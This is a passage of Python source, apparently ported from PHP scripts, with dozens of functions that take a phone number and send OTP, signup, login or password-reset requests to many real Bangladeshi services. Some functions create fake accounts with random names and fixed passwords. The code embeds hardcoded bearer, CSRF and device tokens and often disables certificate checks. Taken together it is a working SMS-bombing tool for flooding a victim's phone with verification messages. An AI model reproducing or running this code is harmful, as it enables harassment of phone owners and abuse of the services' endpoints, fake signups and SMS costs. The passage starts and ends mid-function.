        "accept-language": "en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "origin": "https://www.etestpaper.net",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://www.etestpaper.net/",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
        ),
    }

    # 1) Exists check
    url_exists = "https://prod.etestpaper.net/api/exists"
    data_exists = {"phone": phone}
    try:
        resp1 = requests.post(url_exists, json=data_exists, headers=headers)
        resp1.raise_for_status()
        print("EXISTS Response:", resp1.text)
    except requests.RequestException as e:
        print("EXISTS API Error:", e)

    # 2) Send OTP
    url_otp = "https://prod.etestpaper.net/api/v4/auth/otp"
    data_otp = {
        "phone": phone,
        "recaptcha": "668be73dcad2999a957ff440",
    }
    try:
        resp2 = requests.post(url_otp, json=data_otp, headers=headers)
        resp2.raise_for_status()
        print("OTP Response:", resp2.text)
    except requests.RequestException as e:
        print("OTP API Error:", e)


def call_api31(phone: str) -> None:
    """
    Equivalent to api31.php:
    Checksignup via gpayapp.grameenphone.com.
    """
    url = "https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignup"
    payload = {
        "deviceId": f"35{phone}30",
        "msisdn": phone,
        "tran_type": "OTPREQSIGNUP",
    }
    headers = {
        "Content-Type": "application/json",
    }

    try:
        resp = requests.post(url, json=payload, headers=headers)
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api32(phone: str) -> None:
    """
    Equivalent to api32.php:
    Request login OTP via applink.com.bd.
    """
    msisdn = "88" + phone
    url = "https://apps.applink.com.bd/appstore-v4-server/login/otp/request"
    payload = {
        "msisdn": msisdn,
    }
    headers = {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Origin": "https://applink.com.bd",
        "Pragma": "no-cache",
        "Referer": "https://applink.com.bd/",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
        ),
    }

    try:
        resp = requests.post(
            url,
            json=payload,
            headers=headers,
            verify=False,
        )
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("cURL Error:", e)


def call_api33(phone: str) -> None:
    """
    Equivalent to api33.php:
    Register/login via priyoshikkhaloy.com.
    """
    url = "https://app.priyoshikkhaloy.com/api/user/register-login.php"
    data = {
        "mobile": phone,
    }
    headers = {
        "User-Agent": "okhttp/4.11.0",
        "Accept-Encoding": "gzip",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    try:
        resp = requests.post(
            url,
            data=data,
            headers=headers,
            verify=False,
        )
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api34(phone: str) -> None:
    """
    Equivalent to api34.php:
    Send OTP via api.kabbik.com.
    """
    msisdn = "88" + phone
    url = "https://api.kabbik.com/v1/auth/otpnew"
    current_time_long = int(time.time() * 1000)
    payload = {
        "msisdn": msisdn,
        "currentTimeLong": current_time_long,
        "passKey": "qOQNBtVmoTTPVmfn",
    }
    headers = {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Origin": "https://kabbik.com",
        "Pragma": "no-cache",
        "Referer": "https://kabbik.com/",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
        ),
        "authorization": (
            "Bearer "
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
            "eyJ1c2VyX2lkIjoiMjgyMCIsInJvbGUiOjEsImlhdCI6MTY2NTc0NjIyNX0."
            "dSY47sipaGTI_OtsysFWw_kaKZKWHWRtp4vklstVgVc"
        ),
        "content-type": "application/json",
    }

    try:
        resp = requests.post(
            url,
            json=payload,
            headers=headers,
            verify=False,
        )
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("cURL ERROR:", e)


def call_api35(phone: str) -> None:
    """
    Equivalent to api35.php:
    Check username availability via salextra.com.bd.
    """
    url = "https://salextra.com.bd/customer/checkusernameavailabilityonregistration"
    data = {
        "username": phone,
        "loginType": "MOBILE",
        "__RequestVerificationToken": (
            "CfDJ8LiTcoRywYZJiSdmMqGF8TUqJw9C6KMdGm1h66OVTdHacNf0PM5Ejsmu_DNPddqz7Sk-"
            "XUyXwxIyHALKpZ5bn1jwr9l-9IzOmASY_Z3cKb2mndEZn3KyLqq80U8QyitKCPtmt1zxxiMW"
            "d_970_jfTmg"
        ),
    }
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6",
        "cache-control": "no-cache",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://salextra.com.bd",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://salextra.com.bd/register?returnUrl=%2F",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
        ),
        "x-requested-with": "XMLHttpRequest",
    }

    try:
        resp = requests.post(
            url,
            data=data,
            headers=headers,
        )
        resp.raise_for_status()
        print("Salextra Response:", resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api36(phone: str) -> None:
    """
    Equivalent to api36.php:
    Create customer on sundora.com.bd with +880 phone.
    """
    import re

    if not re.match(r"^01[0-9]{9}$", phone):
        print("Invalid phone number. Must start with 01 and be 11 digits long.")
        return

    url = "https://api.sundora.com.bd/api/user/customer/"
    customer = {
        "email": f"kgjkgjgg{phone}@gmail.com",
        "password": "#bUV?'3*N#7N}.g",
        "password_confirmation": "#bUV?'3*N#7N}.g",
        "phone": "+880" + phone[1:],
        "draft_order_id": None,
        "first_name": "sdfgfd",
        "last_name": "fgfd",
        "note": {
            "birthday": "",
            "gender": "male",
        },
        "withTimeout": True,
        "newsletter_email": True,
        "newsletter_sms": True,
    }
    payload = {"customer": customer}

    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 8.0; Win64; x64; rv:131.0) "
            "Gecko/20100101 Firefox/131.0"
        ),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Referer": "https://sundora.com.bd/",
        "My-Location": "BD",
        "Content-Type": "application/json",
        "Origin": "https://sundora.com.bd",
        "Connection": "keep-alive",
        "Sec-Fetch-Mode": "no-cors",
        "Sec-Fetch-Site": "same-site",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
    }

    try:
        resp = requests.post(url, json=payload, headers=headers)
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("cURL Error:", e)


def call_api37(phone: str) -> None:
    """
    Equivalent to api37.php:
    OTP via api.mygp.cinematic.mobi SBENT_3GB7D endpoint.
    """
    url = f"https://api.mygp.cinematic.mobi/api/v1/otp/88{phone}/SBENT_3GB7D"
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) "
            "Gecko/20100101 Firefox/109.0"
        ),
        "Content-Type": "application/json",
    }
    data = {
        "accessinfo": {
            "access_token": "K165S6V6q4C6G7H0y9C4f5W7t5YeC6",
            "referenceCode": "20190827042622",
        }
    }

    try:
        resp = requests.post(
            url, json=data, headers=headers, verify=False
        )
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api38(phone: str) -> None:
    """
    Equivalent to api38.php:
    Get OTP via bajistar.com API.
    """
    phn_with_code = "88" + phone
    url = (
        "https://bajistar.com:1443/public/api/v1/getOtp"
        f"?recipient={phn_with_code}"
    )
    headers = {
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Origin": "https://www.playbajistar.com",
        "Referer": "https://www.playbajistar.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
        ),
        "accept-language": "en",
    }

    try:
        resp = requests.get(url, headers=headers)
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api39(phone: str) -> None:
    """
    Equivalent to api39.php:
    Authenticate via doctime.com.bd.
    """
    url = "https://api.doctime.com.bd/api/authenticate"
    payload = {
        "contact_no": phone,
        "country_calling_code": "88",
    }
    headers = {
        "User-Agent": "okhttp/4.12.0",
        "Accept": "application/json",
        "Accept-Encoding": "gzip",
        "Content-Type": "application/json",
        "authorization": "",
        "app-version": "0.29.11",
        "device-brand": "Genymobile",
        "platform": "Android",
        "ads-id": "25cc7660-8d1d-4a7b-bdee-ce6b8f9d4934",
        "device-model": "Galaxy S4",
        "device-token": (
            "e7G4_g3QSlKaRPSu5PsC7c:APA91bHLc8RaCWLp6lYXeZuWOnAKNcuH0Ak9KVUgLWbYFWeeB2r76ucOcPNoUkm8VdiCtSDzHv"
            "BdxN6ezZNLwQ2MTfmgrDOiKB0tDHaUk9I31W_JpP74QQ8"
        ),
        "os-version": "11",
        "device-id": "c70f19801544723c",
        "locale": "bn",
        "content-type": "application/json; charset=UTF-8",
    }

    try:
        resp = requests.post(
            url,
            json=payload,
            headers=headers,
            verify=False,
        )
        resp.raise_for_status()
        print("Response:", resp.text)
    except requests.RequestException as e:
        print("CURL Error:", e)


def call_api40(phone: str) -> None:
    """
    Equivalent to api40.php:
    Send OTP via webloginda.grameenphone.com.
    """
    url = "https://webloginda.grameenphone.com/backend/api/v1/otp"
    data = {"msisdn": phone}
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9,ru;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://gpfi.grameenphone.com",
        "Referer": "https://gpfi.grameenphone.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        ),
    }

    try:
        resp = requests.post(url, data=data, headers=headers)
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("Curl error:", e)


def call_api41(phone: str) -> None:
    """
    Equivalent to api41.php:
    Send OTP via meenabazardev.com.
    """
    url = (
        "https://meenabazardev.com/api/mobile/front/send/otp"
        f"?CellPhone={requests.utils.quote(phone)}&type=login"
    )
    headers = {
        "User-Agent": "Dart/3.2 (dart:io)",
        "Accept-Encoding": "gzip",
        "content-type": "application/json",
    }

    try:
        resp = requests.post(url, headers=headers)
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("cURL Error #:", e)


def call_api42(phone: str) -> None:
    """
    Equivalent to api42.php:
    Send OTP via medeasy.health with +88 prefix.
    """
    final_phone = "+88" + phone
    url = f"https://api.medeasy.health/api/send-otp/{final_phone}/"
    headers = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6",
        "cache-control": "no-cache",
        "origin": "https://medeasy.health",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://medeasy.health/",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
        ),
    }

    try:
        resp = requests.get(url, headers=headers)
        resp.raise_for_status()
        print("Medeasy OTP Response:", resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api43(phone: str) -> None:
    """
    Equivalent to api43.php:
    Send OTP via iqra-live.com.
    """
    url = f"http://apibeta.iqra-live.com/api/v1/sent-otp/{phone}"

    try:
        resp = requests.get(url, verify=False)
        resp.raise_for_status()
        print("Response:", resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api44(phone: str) -> None:
    """
    Equivalent to api44.php:
    Passenger login mobile via chokrojan.com.
    """
    url = "https://chokrojan.com/api/v1/passenger/login/mobile"
    payload = {
        "mobile_number": phone,
        "otp_token": (
            "826cb796fd3f163c420c8da1238aa9d1c4da36d4f5729d711a9cacaca47df5a7"
        ),
    }
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6",
        "Access-Control-Allow-Origin": "*",
        "Authorization": "Bearer null",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Content-Type": "application/json;charset=UTF-8",
        "Origin": "https://chokrojan.com",
        "Pragma": "no-cache",
        "Referer": "https://chokrojan.com/login",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
        ),
        "company-id": "1",
        "domain-name": "chokrojan.com",
        "sec-ch-ua": (
            '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"'
        ),
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "user-platform": "3",
    }

    try:
        resp = requests.post(
            url,
            json=payload,
            headers=headers,
            verify=False,
        )
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("cURL Error:", e)


def call_api45(phone: str) -> None:
    """
    Equivalent to api45.php:
    Send OTP via backend-api.shomvob.co with bearer token.
    """
    if not phone:
        print("Request phone Number")
        return

    url = "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0"
    payload = {"phone": "88" + phone}
    headers = {
        "User-Agent": (
            "Dalvik/2.1.0 (Linux; U; Android 13; GM1917 Build/SP1A.210812.016)"
        ),
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "Authorization": (
            "Bearer "
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
            "eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0."
            "4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s"
        ),
        "Content-Type": "application/json; charset=utf-8",
    }

    try:
        resp = requests.post(
            url,
            json=payload,
            headers=headers,
        )
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("cURL Error #:", e)


def call_api46(phone: str) -> None:
    """
    Equivalent to api46.php:
    Signup via api.redx.com.bd (same as api1 but fixed name).
    """
    url = "https://api.redx.com.bd/v1/user/signup"
    payload = {
        "name": "Alamin Sheikh",
        "phoneNumber": phone,
        "service": "redx",
    }
    headers = {
        "Content-Type": "application/json",
    }

    try:
        resp = requests.post(
            url,
            json=payload,
            headers=headers,
            verify=False,
        )
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api47(phone: str) -> None:
    """
    Equivalent to api47.php:
    Send common OTP via api.mygp.cinematic.mobi.
    """
    url = f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{phone}/"
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) "
            "Gecko/20100101 Firefox/109.0"
        ),
        "Content-Type": "application/json",
    }

    try:
        resp = requests.post(
            url,
            headers=headers,
            verify=False,
        )
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api48(phone: str) -> None:
    """
    Equivalent to api48.php:
    Create account on mybdjobs orchestrator with random name/email.
    """
    first_names = [
        "Arif",
        "Hasib",
        "Kamrul",
        "Sohag",
        "Raihan",
        "Farhan",
        "Zahid",
        "Imran",
        "Sajib",
        "Munna",
    ]
    first_name = random.choice(first_names)
    random_str = "".join(
        random.choice(string.ascii_lowercase + string.digits)
        for _ in range(8)
    )
    email = f"{first_name.lower()}{random_str}@gmail.com"

    url = (
        "https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/"
        "CreateAccountOrchestrator/CreateAccount"
    )
    payload = {
        "firstName": first_name,
        "lastName": "",
        "gender": "M",
        "email": email,
        "userName": phone,
        "password": "Kamrul12345@",
        "confirmPassword": "Kamrul12345@",
        "status": 0,
        "mobile": phone,
        "workAreaCategory": 2,
        "createdFrom": 0,
        "createdAt": time.strftime("%Y-%m-%dT%H:%M:%S"),
        "decodeId": "",
        "catTypeId": 1,
        "userNameType": "mobile",
        "disabilityId": "",
        "deviceTypeId": 0,
        "countryCode": "88",
        "socialMediaId": "",
        "socialMediaName": "",
        "socialMediaTimestamp": time.strftime("%Y-%m-%dT%H:%M:%S"),
        "ttcId": "",
        "gradeId": "",
        "knownBy": "",
        "isTtc": False,
        "trainingCenterName": "",
        "trainingDistrict": "",
        "queryString": "",
        "campaignId": 0,
        "campaignSource": "",
        "campaignReferer": "",
        "isFromSocialMedia": False,
        "isActive": 0,
        "useType": "",
        "uNtype": 0,
    }
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "origin": "https://mybdjobs.bdjobs.com",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://mybdjobs.bdjobs.com/",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
        ),
    }

    try:
        resp = requests.post(url, json=payload, headers=headers)
        resp.raise_for_status()
        print(f"Generated Name: {first_name}")
        print(f"Generated Email: {email}")
        print("BDJobs Response:", resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api49(phone: str) -> None:
    """
    Equivalent to api49.php:
    Register then forget password via ultimateasiteapi.com.
    """
    # 1) Register
    url_register = "https://ultimateasiteapi.com/api/register-customer"
    data_register = {
        "customer_name": "hu",
        "customer_password": "12345678",
        "customer_password_confirmation": "12345678",
        "customer_email": f"{phone}hu@gmail.com",
        "customer_contact": phone,
        "customer_dob": "2000-01-02",
        "customer_gender": "male",
    }
    try:
        resp1 = requests.post(
            url_register,
            json=data_register,
            headers={"Content-Type": "application/json"},
            verify=False,
        )
        resp1.raise_for_status()
        print("Register Response:", resp1.text)
    except requests.RequestException as e:
        print("Register Error:", e)

    # 2) Forget password
    url_forget = "https://ultimateasiteapi.com/api/forget-customer-password"
    data_forget = {"user_input": phone}
    headers_forget = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "origin": "https://ultimateorganiclife.com",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://ultimateorganiclife.com/",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
        ),
    }

    try:
        resp2 = requests.post(
            url_forget,
            json=data_forget,
            headers=headers_forget,
            verify=False,
        )
        resp2.raise_for_status()
        print("Forget Password Response:", resp2.text)
    except requests.RequestException as e:
        print("Forget Password Error:", e)


def call_api50(phone: str) -> None:
    """
    Equivalent to api50.php:
    Forgot password then signup via foodaholic.com.bd.
    """
    if not phone:
        print("Phone number is required.")
        return

    formatted_phn = "+88" + phone.lstrip("0")
    first_names = [
        "John",
        "Jane",
        "Alex",
        "Chris",
        "Taylor",
        "Morgan",
        "Jordan",
        "Sam",
    ]
    last_names = [
        "Smith",
        "Doe",
        "Brown",
        "Wilson",
        "Anderson",
        "Taylor",
        "Clark",
        "Johnson",
    ]
    random_first = random.choice(first_names)
    random_last = random.choice(last_names) + str(random.randint(100, 999))
    random_email = f"{phone}_{random.randint(100, 999)}@example.com"

    headers = {
        "User-Agent": "Dart/3.2 (dart:io)",
        "Accept-Encoding": "gzip",
        "Content-Type": "application/json; charset=UTF-8",
        "authorization": "Bearer null",
        "longitude": '""',
        "zoneid": '""',
        "latitude": '""',
        "x-localization": "en",
    }

    # Forgot password
    url_fp = "https://foodaholic.com.bd/api/v1/auth/forgot-password"
    payload_fp = {"phone": formatted_phn}
    try:
        resp_fp = requests.post(
            url_fp,
            json=payload_fp,
            headers=headers,
        )
        status = resp_fp.status_code
        print("Forgot Password Response:", resp_fp.text)
    except requests.RequestException as e:
        print("Forgot Password Error:", e)
        status = None

    # If 404, sign up
    if status == 404:
        url_su = "https://foodaholic.com.bd/api/v1/auth/sign-up"
        payload_su = {
            "f_name": random_first,
            "l_name": random_last,
            "phone": formatted_phn,
            "email": random_email,
            "password": "Riyaz@123",
            "ref_code": "",
        }
        try:
            resp_su = requests.post(
                url_su,
                json=payload_su,
                headers=headers,
            )
            resp_su.raise_for_status()
            print("Sign-up Response:", resp_su.text)
        except requests.RequestException as e:
            print("Sign-up Error:", e)


def call_api51(phone: str) -> None:
    """
    Equivalent to api51.php:
    OPTIONS then GET OTP via web-api.binge.buzz.
    """
    url = f"https://web-api.binge.buzz/api/v3/otp/send/{requests.utils.quote(phone)}"

    # OPTIONS request (CORS preflight)
    options_headers = {
        "Host": "web-api.binge.buzz",
        "Connection": "keep-alive",
        "Accept": "*/*",
        "Access-Control-Request-Method": "GET",
        "Access-Control-Request-Headers": "authorization,device-type",
        "Origin": "https://binge.buzz",
        "User-Agent": (
            "Mozilla/5.0 (Linux; Android 13; RMX3286 Build/SP1A.210812.016) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 "
            "Mobile Safari/537.36"
        ),
        "Sec-Fetch-Mode": "cors",
        "X-Requested-With": "mark.via.gp",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://binge.buzz/",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        resp_opt = requests.options(url, headers=options_headers)
        print("OPTIONS Status:", resp_opt.status_code)
        print("OPTIONS Content:", resp_opt.text)
    except requests.RequestException as e:
        print("OPTIONS Error:", e)

    # GET request
    get_headers = {
        "Host": "web-api.binge.buzz",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "Device-Type": "web",
        "Authorization": (
            "Bearer "
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
            "eyJzdGF0dXMiOiJGcmVlIiwiY3JlYXRlZEF0IjoiY3JlYXRlIGRhdGUiLCJ1cGRhdGVkQXQiOiJ1cGRhdGUgZGF0ZSIsInR5cGUiOiJ0b2tlbiIsImRldlR5cGUiOiJ3ZWIiLCJleHRyYSI6IjMxNDE1OTI2IiwiaWF0IjoxNzAzODUwMjYxLCJleHAiOjE3MDQwMjMwNjF9.nCgP-U4r6CYuTO_i4Nz97YiaI2jsi45d2n-9ZQN3qt0"
        ),
        "User-Agent": (
            "Mozilla/5.0 (Linux; Android 13; RMX3286 Build/SP1A.210812.016) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 "
            "Mobile Safari/537.36"
        ),
        "sec-ch-ua-platform": '"Android"',
        "Origin": "https://binge.buzz",
        "X-Requested-With": "mark.via.gp",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://binge.buzz/",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        resp_get = requests.get(url, headers=get_headers)
        print("GET Status:", resp_get.status_code)
        print("GET Content:", resp_get.text)
    except requests.RequestException as e:
        print("GET Error:", e)


def call_api52(phone: str) -> None:
    """
    Equivalent to api52.php:
    Register via api.kfcbd.com with random email.
    """
    url = "https://api.kfcbd.com/register"
    random_string = "".join(
        random.choice(string.ascii_letters) for _ in range(8)
    )
    email = f"monirk2ib+{random_string}@gmail.com"
    payload = {
        "id": None,
        "name": "Sojib khane",
        "email": email,
        "mobile": phone,
        "address": None,
        "device_token": (
            "dLvYmVLqT02A_ZAFsFa8gJ:APA91bHC8CtSoO-TaN-NFm4obg10-Blc1vji2lbq82KbIyEGsXobCa8hZs-"
            "XbWjyTYnLE7KgYDRWKdteBgU6zvixuYG-vV4aGCEvkItCk6DiXYKVvd_"
            "ecWxqraqX6vyYJMfWDWDeF1EG"
        ),
        "token": None,
        "dob": "",
        "otp": None,
    }
    headers = {
        "User-Agent": "Dart/3.1 (dart:io)",
        "Accept-Encoding": "gzip",
        "Content-Type": "application/json",
    }

    try:
        resp = requests.post(
            url,
            json=payload,
            headers=headers,
            verify=False,
        )
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("Curl error:", e)


def call_api53(phone: str) -> None:
    """
    Equivalent to api53.php:
    Send OTP via bkwebsitethc.grameenphone.com.
    """
    url = "https://bkwebsitethc.grameenphone.com/api/v1/offer/send_otp"
    payload = {"msisdn": phone}
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Origin": "https://www.grameenphone.com",
        "Pragma": "no-cache",
        "Referer": "https://www.grameenphone.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
        ),
        "lang": "en",
    }

    try:
        resp = requests.post(
            url,
            json=payload,
            headers=headers,
            verify=False,
        )
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("cURL Error:", e)


def call_api54(phone: str) -> None:
    """
    Equivalent to api54.php:
    Register then login-OTP via eonbazar.com.
    """
    # random generators
    def generate_random_name(length: int = 8) -> str:
        chars = "abcdefghijklmnopqrstuvwxyz"
        return "".join(random.choice(chars) for _ in range(length)).capitalize()

    def generate_random_string(length: int = 10) -> str:
        chars = string.ascii_letters
        return "".join(random.choice(chars) for _ in range(length))

    def generate_random_number(length: int = 4) -> str:
        chars = "0123456789"
        return "".join(random.choice(chars) for _ in range(length))

    random_name = generate_random_name()
    email = f"{generate_random_string()}{generate_random_number()}@gmail.com"

    # Register
    register_url = "https://app.eonbazar.com/api/auth/register"
    register_headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        ),
        "Content-Type": "application/json",
        "carttoken": "5d7bcfdb-27ae-453f-a4b9-6cf94da73032",
        "ordersource": "web",
        "origin": "https://eonbazar.com",
        "referer": "https://eonbazar.com/",
    }
    register_payload = {
        "mobile": phone,
        "name": random_name,
        "password": "Soji12345",
        "email": email,
    }
    try:
        resp_reg = requests.post(
            register_url,
            json=register_payload,
            headers=register_headers,
            verify=False,
        )
        print("REGISTER RESPONSE:", resp_reg.text)
    except requests.RequestException as e:
        print("Register Error:", e)

    # Login OTP
    login_url = "https://app.eonbazar.com/api/auth/login"
    login_headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6",
        "cache-control": "no-cache",
        "carttoken": "6c2f5732-65f7-461d-be7e-5dc887af6d37",
        "content-type": "application/json",
        "origin": "https://eonbazar.com",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://eonbazar.com/",
        "user-agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
        ),
    }
    trim_mobile = phone.lstrip("0")
    login_payload = {
        "method": "otp",
        "mobile": trim_mobile,
    }
    try:
        resp_login = requests.post(
            login_url,
            json=login_payload,
            headers=login_headers,
            verify=False,
        )
        resp_login.raise_for_status()
        print("LOGIN OTP RESPONSE:", resp_login.text)
    except requests.RequestException as e:
        print("Login Error:", e)


def call_api55(phone: str) -> None:
    """
    Equivalent to api55.php:
    App-connect via api.eat-z.com with +880 phone.
    """
    formatted_phone = "+880" + phone.lstrip("0")
    url = "https://api.eat-z.com/auth/customer/app-connect"
    payload = {"username": formatted_phone}
    headers = {
        "User-Agent": "okhttp/4.12.0",
        "Accept": "application/json",
        "Accept-Encoding": "gzip",
        "x-eatz-apiclient": "ANDROID",
        "content-type": "application/json; charset=UTF-8",
    }

